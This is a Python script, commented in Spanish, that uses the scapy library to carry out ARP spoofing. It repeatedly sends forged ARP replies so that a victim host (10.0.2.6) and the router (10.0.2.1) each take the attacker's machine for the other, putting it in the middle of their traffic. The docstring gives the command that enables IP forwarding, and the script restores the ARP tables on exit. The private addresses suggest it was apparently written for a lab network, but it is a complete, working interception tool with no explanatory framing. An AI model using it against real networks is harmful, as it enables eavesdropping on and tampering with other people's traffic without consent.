#!/usr/bin/env python3

"""MITM
Para permitir que la máquina atacante redirija las peticiones es necesario ejecutar
echo 1 > /proc/sys/net/ipv4/ip_forward
"""

import scapy.all as scapy
import time
# import sys python 2


def scan(ip="10.0.2.1"):
    arp = scapy.ARP(pdst=ip)  # Seteamos el valor
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp
    # Seleccionamos solo el primer elemento de la lista
    net_list = scapy.srp(arp_request_broadcast, timeout=2, verbose=False)[0]
    mac_list = []
    for terminal in net_list:
        ip_mac = {"ip": terminal[1].psrc, "mac": terminal[1].hwsrc}
        mac_list.append(ip_mac)
    return mac_list


def spoof(target_ip="10.0.2.1", target_mac="", des_ip="10.0.2.1"):
    """Mandamos un paquete ARP, indicado a la des_ip, que la target_ip
    pertenece a la target_mac"""
    # Op=2 para response, no request
    # pdst="10.0.2.15" .. la dir ip target
    # hwdst="08:00:27:e7:53:c8" target mac
    # psrc="10.0.2.1" router ip
    if target_mac == "":
        target_mac = scan(target_ip)[0]["mac"]

    catch = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=des_ip)
    scapy.send(catch, verbose=False)


def restore(target_ip="10.0.2.1", target_mac="", des_ip="10.0.2.1"):
    """Mandamos un paquete ARP, indicado a la des_ip, que la target_ip
    pertenece a la target_mac"""
    # Op=2 para response, no request
    # pdst="10.0.2.15" .. la dir ip target
    # hwdst="08:00:27:e7:53:c8" target mac
    # psrc="10.0.2.1" router ip
    if target_mac == "":
        target_mac = scan(target_ip)[0]["mac"]

    des_mac = scan(des_ip)[0]["mac"]

    catch = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=des_ip,
                      hwsrc=des_mac)
    scapy.send(catch, count=4, verbose=False)


paquetes_mandados = 0
try:
    while True:
        """Engañamos a la víctima como que somos nosotros el router"""
        spoof(target_ip="10.0.2.6")
        """Engañamos al router como que somos nosotros la víctima"""
        spoof(des_ip="10.0.2.6")
        paquetes_mandados = paquetes_mandados + 2
        # python 2 La coma, es para almacenar la salida en el buffer
        # print("\rPaquetes mandados " + str(paquetes_mandados)),
        # python2 Obligamos a pintar el buffer en pantalla
        # sys.stdout.flush()
        # Python3
        print("\rPaquetes mandados " + str(paquetes_mandados), end="")
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip="10.0.2.6")
    restore(des_ip="10.0.2.1")
    print("Bye bye")
